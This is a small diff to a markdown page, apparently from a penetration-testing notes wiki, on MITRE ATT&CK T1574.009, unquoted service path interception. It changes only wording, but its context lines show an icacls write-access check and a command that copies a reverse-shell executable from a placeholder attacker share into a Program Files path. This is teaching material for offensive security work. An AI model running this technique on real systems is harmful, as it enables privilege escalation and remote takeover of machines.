@@ -1,6 +1,5 @@
 ---
-description: >-
-  MITRE ATT&CK™  Hijack Execution Flow: Path Interception by Unquoted Path  -
+description: MITRE ATT&CK™ - Hijack Execution Flow Path Interception by Unquoted Path  -
   Technique T1574.09
 ---
 
@@ -47,7 +46,7 @@ You can check if you have write acces to a folder with `icacls`
 icacls "C:\Program Files\A Subfolder\"
 ```
 
-If you can write to it, you can put your binary like:
+If you can write to it, you can place your binary like:
 ```powershell
 copy \\ATTACKING_IP\Share\reverse.exe C:\Program Files\A Subfolder\B.exe  
 ```
